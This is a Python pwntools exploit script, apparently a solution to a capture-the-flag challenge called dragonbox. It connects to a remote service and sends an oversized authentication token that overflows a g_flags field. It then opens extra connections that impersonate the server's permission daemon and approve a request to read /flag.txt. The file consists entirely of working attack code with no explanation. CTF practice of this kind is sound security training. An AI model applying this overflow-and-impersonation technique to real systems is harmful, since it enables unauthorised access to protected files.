#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "dragonbox.hackable.software"
PORT = 24028

def connect():
	if LOCAL:
		con = remote("localhost", 7777)
	else:
		con = remote(HOST, PORT)

	return con

def exploit(r):
	log.info("Open connection 2 in waiting state")
	r2 = connect()

	log.info("Send authentication token to overflow g_flags")
	payload = "A:" + "B"*0x100 + p16(6)
	
	r.send(payload)
	r.recvuntil("Welcome!")

	log.info("Trigger file request to spawn permission daemon")

	path = "/flag.txt"
	
	filerequest = "1" + p32(len(path)) + path

	r.send(filerequest)

	r.recvuntil("denied")

	log.info("Fix gflags via 2nd client")
	payload = "A:" + "B"*0x100 + p16(0)

	r2.send(payload)
	r2.recvuntil("Welcome!")

	log.info("Create more connections to impersonate permission daemon")
	r3 = connect()
	r4 = connect()		# daemon	
	r5 = connect()		# daemon 

	r4.sendline("default:default")
	r4.recvuntil("Welcome!")

	log.info("Send file request again to our own daemon")
	r.send(filerequest)

	log.info("Send allow response")
	r4.send(p32(3)+"yes")	

	r.interactive()
	
	return

if __name__ == "__main__":
	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = remote("localhost", 7777)
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)